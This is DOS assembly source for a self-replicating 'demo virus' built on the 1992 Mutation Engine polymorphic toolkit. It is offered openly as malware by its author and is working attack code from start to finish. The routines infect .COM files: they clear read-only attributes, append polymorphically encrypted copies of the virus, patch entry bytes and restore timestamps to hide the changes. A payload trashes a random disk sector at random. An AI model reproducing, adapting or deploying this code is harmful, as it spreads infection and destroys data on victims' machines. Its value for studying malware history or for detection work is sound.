
; This is a demo virus to demonstrate
;   the Mutation Engine <tm> usage

; Version 1.01 (1-3-92)
; (C) 1992 Dark Avenger.

	.model	tiny
	.radix	16
	.code

	extrn	mut_engine: near, rnd_get: near, rnd_init: near
	extrn	rnd_buf: word, data_top: near

	org	100

start:
	call	locadr
reladr:
        db      'Just a simple demo...'
locadr:
	pop	dx
	mov	cl,4
	shr	dx,cl
	mov	cx,ds
	add	cx,dx			;Calculate new CS
	mov	dx,offset begin
	push	cx dx
	retf
begin:
	cld
	mov	di,offset start
	push	es di
	push	cs
	pop	ds
	mov	si,offset old_cod
	movsb				;Restore first 3 bytes
	push	ax
	mov	dx,offset dta_buf	;Set DTA
	mov	ah,1a
	int	21
	mov	ax,3524 		;Hook INT 24
	int	21
	push	es bx
	mov	dx,offset fail_err
	mov	ax,2524
	int	21
	xor	ax,ax			;Initialize random seed
	call	rnd_init
	push	sp
	pop	cx
	sub	cx,sp
	add	cx,4
	push	cx
	mov	dx,offset srchnam
	mov	cl,3
	mov	ah,4e
find_lup:
	int	21			;Find the next COM file
	jc	infect_done
	cmp	[dta_buf+1a],ch
	jnz	infect			;If not infected, infect it now
find_nxt:
	push	cx
	mov	dx,offset dta_buf
	mov	ah,4f
	jmp	find_lup
infect_done:
	pop	cx
	loop	find_nxt
	jnc	damage_done
	test	al,1
	jz	damage_done
	xchg	ax,dx			;Trash a random sector on the default
        mov     ah,39                   ;  drive
	int	21
	mov	cx,1
	mov	bx,offset start
	int	26
	popf
damage_done:
	pop	dx ds
	mov	ax,2524 		;Restore INT 24
	int	21
	pop	ds
	mov	dx,80			;Restore DTA
	mov	ah,1a
	int	21
	push	ds			;Exit to program
	pop	es
	pop	ax
	retf
infect:
	xor	cx,cx			;Reset read-only attribute
	mov	ax,4301
	int	21
	jc	infect_done
	mov	ax,3d02 		;Open the file
	int	21
	jc	infect_done
	xchg	ax,bx
	mov	dx,offset old_cod	;Read first 3 bytes
	mov	cx,3
	mov	ah,3f
	int	21
	jc	read_done
	mov	ax,word ptr [old_cod]	;Make sure it's not an EXE file
	cmp	ax,'ZM'
	jz	read_done
	cmp	ax,'MZ'
	jz	read_done
	xor	cx,cx			;Seek at EOF
	mov	ax,4202
	int	21
	test	dx,dx			;Make sure the file is not too big
	jnz	read_done
	cmp	ax,-2000
	jnc	read_done
	mov	bp,ax
	sub	ax,3
	mov	word ptr [new_cod+1],ax
	mov	ax,5700 		;Save file's date/time
	int	21
	push	dx cx
	mov	ax,offset data_top+0f
	mov	cl,4			;Now call the Engine
	shr	ax,cl
	mov	es,ax
	mov	dx,offset start
	mov	cx,offset _DATA
	push	bp bx
	add	bp,dx
	xor	si,si
	mov	ax,101
	call	mut_engine
	pop	bx ax
	add	ax,cx			;Make sure file length mod 256 = 0
	neg	ax
	xor	ah,ah
	add	cx,ax
	push	cs
	pop	ds
	jc	write_done
	sub	cx,ax
	jnz	write_done
	mov	dx,offset new_cod
	mov	cx,3
	mov	ah,40
	int	21
write_done:
	pop	cx dx			;Restore file's date/time
	mov	ax,5701
	int	21
read_done:
	mov	ah,3e			;Close the file
	int	21
	jmp	infect_done

fail_err:				;Critical errors handler
	mov	al,3
	iret

srchnam db	'*.COM',0

old_cod:				;Buffer to read first 3 bytes
	ret
	dw	?

new_cod:				;Buffer to write first 3 bytes
	jmp	$+100

	.data

dta_buf db	2bh dup(?)		;Buffer for DTA

	end	start
